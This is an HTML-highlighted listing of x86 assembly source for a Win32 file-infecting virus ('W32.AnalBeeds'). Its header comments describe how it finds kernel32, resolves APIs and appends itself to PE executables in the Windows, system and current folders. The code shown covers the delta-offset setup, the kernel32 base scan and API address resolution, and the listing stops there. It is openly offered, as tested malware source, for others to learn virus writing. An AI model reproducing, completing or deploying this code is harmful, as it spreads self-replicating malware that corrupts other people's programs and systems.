<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Mohmed.4354 - AnalBeeds.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
	background: #FFFFCC;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ I N T R O ]</span><span class="sc0">
</span><span class="sc1">;   This virus has nothing special in it other than to be a straight</span><span class="sc0">
</span><span class="sc1">;   forward examples for others who wannt to learn, the virus is</span><span class="sc0">
</span><span class="sc1">;   heavily commented and tested, so it should work and you can then</span><span class="sc0">
</span><span class="sc1">;   later make new stuff after you have learnt from this one, simple</span><span class="sc0">
</span><span class="sc1">;   as that so have fun :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ V I R U S   I N F O R M A T I O N ]</span><span class="sc0">
</span><span class="sc1">;   Name       : W32.AnalBeeds</span><span class="sc0">
</span><span class="sc1">;   Size       : 8,192 Bytes</span><span class="sc0">
</span><span class="sc1">;   Infects    : PE EXE Files</span><span class="sc0">
</span><span class="sc1">;   Payload    : None</span><span class="sc0">
</span><span class="sc1">;   Description: When the virus is first executed it first gets</span><span class="sc0">
</span><span class="sc1">;                the API addresses of the API's we are going to use</span><span class="sc0">
</span><span class="sc1">;                the method am using is by the following:</span><span class="sc0">
</span><span class="sc1">;                   - locating the image base of kernel32.dll</span><span class="sc0">
</span><span class="sc1">;                   - Locate LoadLibraryA by examining the exports</span><span class="sc0">
</span><span class="sc1">;                     of kernel32</span><span class="sc0">
</span><span class="sc1">;                   - Load user32.dll</span><span class="sc0">
</span><span class="sc1">;                   - Locate API's we want to get their address</span><span class="sc0">
</span><span class="sc1">;                   - Get thie addresses</span><span class="sc0">
</span><span class="sc1">;                   - Save them to use them again later</span><span class="sc0">
</span><span class="sc1">;                Then the virus tries to infect the files in 3 different folder</span><span class="sc0">
</span><span class="sc1">;                like windows, system and current directory after it found PE files</span><span class="sc0">
</span><span class="sc1">;                it tries to infect them by appending to the PE file's last sectoin</span><span class="sc0">
</span><span class="sc1">;                and increases it to fit for the virus as well, and then exits.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ G R E E T I N G S ]</span><span class="sc0">
</span><span class="sc1">;   DR-EF, VxF, BlueOwl, DiA, Toro, Knowdeth, Capoeira</span><span class="sc0">
</span><span class="sc1">;   Benny, Z0mbie, Belial, Ratter, GriYo, VirusBuster</span><span class="sc0">
</span><span class="sc1">;   SlageHammer, VirusJoe, SnakeMan, P0sitron, i0n</span><span class="sc0">
</span><span class="sc1">;   Cyclone00, Metal and all other people</span><span class="sc0">
</span><span class="sc1">;   i forgot to mention so sorry if i did</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ S P E C I A L  T H A N K S]</span><span class="sc0">
</span><span class="sc1">;   BlueOwl, VxF, DR-EF, Toro SlageHammer for finding bugs, beta testing</span><span class="sc0">
</span><span class="sc1">;   and helping me with this one</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ S H O U T S ]</span><span class="sc0">
</span><span class="sc1">;   Excentric  --</span><span class="sc0">
</span><span class="sc1">;   ACiD-WaRZ     \
;   rustymemory   |--&gt;  { Obp + Fsec }</span><span class="sc0">
</span><span class="sc1">;   lordx         /</span><span class="sc0">
</span><span class="sc1">;   pronco     --</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Sven Jaschan, Chen Ing-Hau, Gigabyte</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ ;</span><span class="sc0">
</span><span class="sc1">; $---------------------( D I S C L A I M E R )---------------------$ ;</span><span class="sc0">
</span><span class="sc1">; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ ;</span><span class="sc0">
</span><span class="sc1">;                                                                     ;</span><span class="sc0">
</span><span class="sc1">;  SUE ME FOR WRITTING THIS :)                                        ;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc5">dummy</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">VirusStart</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDelta</span><span class="sc0">

</span><span class="sc5">GetDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetDelta</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; At the very beginning the first dword on the stack</span><span class="sc0">
                                    </span><span class="sc1">; Contains a pointer inside kernel32</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000FFFh</span><span class="sc0">                      </span><span class="sc1">; The image base has to be a multiple of the memory alignment</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000FFFh</span><span class="sc0">

</span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">kernel32_found</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">

</span><span class="sc5">kernel32_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__DLL_User32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Load user32.dll</span><span class="sc0">
                                    </span><span class="sc1">; in return, eax = image base of user32</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_MessageBoxA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_MessageBoxA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_ExitProcess</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_ExitProcess</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_FindFirstFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_FindNextFileA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_FindNextFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetFileAttributesA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetFileAttributesA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_CreateFileA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_CreateFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_GetFileTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetFileTime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_GetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_CreateFileMappingA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_MapViewOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_UnmapViewOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_CloseHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">__API_SetFileTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetFileTime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_SetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetFilePointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetWindowsDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetSystemDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_GetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__API_SetEndOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunctionAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__ADDR_SetEndOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">



